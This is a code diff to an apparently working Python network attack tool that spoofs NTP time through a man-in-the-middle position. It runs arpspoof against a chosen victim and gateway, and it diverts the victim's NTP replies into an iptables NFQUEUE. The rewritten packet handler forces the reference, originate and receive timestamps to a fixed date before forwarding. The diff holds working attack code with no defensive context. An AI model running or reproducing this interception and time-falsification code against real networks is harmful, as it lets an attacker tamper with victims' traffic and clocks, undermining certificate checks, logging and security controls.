@@ -33,14 +33,30 @@ TIME_ASSIGN = {'year': 2018, 'month': 11, 'day': 10, 'hour': 11, 'minute': 11, '
 
 
 def check_ntp(packet):  # argument is packet from netfilter queue
-    kamene_packet = packet.get_payload()  # gets the IP payload
-    a = IP(kamene_packet)
 
-    if UDP in kamene_packet:
-        if kamene_packet[UDP].sport == '123':
-            modified_packet = modify_ntp(kamene_packet)
+    kamene_packet = IP(packet.get_payload())
+    print('incoming packet:\n')
+    print(kamene_packet.show())
+    if kamene_packet.haslayer(NTP) and kamene_packet.getlayer(NTP).mode == 4:
+       print('normal packet processing:\n')
+       modify_ntp(kamene_packet.getlayer(NTP))
+       print(kamene_packet.show())
+    else:
+        #see if we can salvage ntp packet
+        print('Problem packet fixed:\n')
+        salvaged_ntp_packet = NTP(bytes(kamene_packet.getlayer(UDP).payload))
+        print(salvaged_ntp_packet.show())
+        if salvaged_ntp_packet.haslayer(NTP) and salvaged_ntp_packet.getlayer(NTP).mode == 4:
+            print('fixed packet processing:\n')
+            modify_ntp(salvaged_ntp_packet)
+            print(salvaged_ntp_packet.show())
+            kamene_packet.getlayer(UDP).payload = bytes(salvaged_ntp_packet)
+            print(kamene_packet.show())
         else:
-            print("Not an NTP server response")
+            print("wasn't valid ntp packet from server\n")
+
+    packet.accept()
+
 
 
 def modify_ntp(ntp_packet):  # argument is ntp payload
@@ -49,11 +65,18 @@ def modify_ntp(ntp_packet):  # argument is ntp payload
     :param ntp_packet: kamene ntp packet
     :return:
     """
-    ntp_packet.ref = adjust_ntp_time_by(ntp_packet.ref, datetime.timedelta(**TIME_ADJUST_BY))
+    # ntp_packet.ref = adjust_ntp_time_by(ntp_packet.ref, datetime.timedelta(**TIME_ADJUST_BY))
     # ntp_packet.ref = adjust_ntp_time_fields(ntp_packet.ref, TIME_ADJUST_FIELDS)
-    # ntp_packet.ref = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
-    ntp_packet.orig = adjust_ntp_time_by(ntp_packet.orig, datetime.timedelta(**TIME_ADJUST_BY))
-    ntp_packet.recv = adjust_ntp_time_by(ntp_packet.recv, datetime.timedelta(**TIME_ADJUST_BY))
+    ntp_packet.ref = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
+
+    #ntp_packet.orig = adjust_ntp_time_by(ntp_packet.orig, datetime.timedelta(**TIME_ADJUST_BY))
+    # ntp_packet.orig = adjust_ntp_time_fields(ntp_packet.orig, TIME_ADJUST_FIELDS)
+    ntp_packet.orig = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
+
+    #ntp_packet.recv = adjust_ntp_time_by(ntp_packet.recv, datetime.timedelta(**TIME_ADJUST_BY))
+    # ntp_packet.recv = adjust_ntp_time_fields(ntp_packet.recv, TIME_ADJUST_FIELDS)
+    ntp_packet.recv = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
+    
     return ntp_packet
 
 
@@ -163,8 +186,6 @@ def main():  # no arguments
     p = Popen(['arpspoof', '-t', gateway, vict], stderr=DEVNULL, stdout=DEVNULL)
     q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
     os.system('iptables -t raw -A PREROUTING -p udp -d ' + vict + ' --sport 123 -j NFQUEUE --queue-num 99')
-    # os.system('iptables -N NTPSPOOF')
-    # os.system('iptables -I INPUT -p udp -d ' + gateway + '/24 --sport 123 -j NFQUEUE --queue-num 99')
     """
     -t : tables; we use raw: for nfqueue types - prerouting (for packets arriving from any network interface) and output
     -A : Append rule to the said table
@@ -183,9 +204,6 @@ def main():  # no arguments
     except KeyboardInterrupt:
         print("Spoofing stopped")
         os.system('iptables -F -vt raw')
-        # os.system('iptables -F NTPSPOOF')
-        # os.system('iptables -X NTPSPOOF')
-        # os.system('iptables -F INPUT')
         os.system(" echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 main()
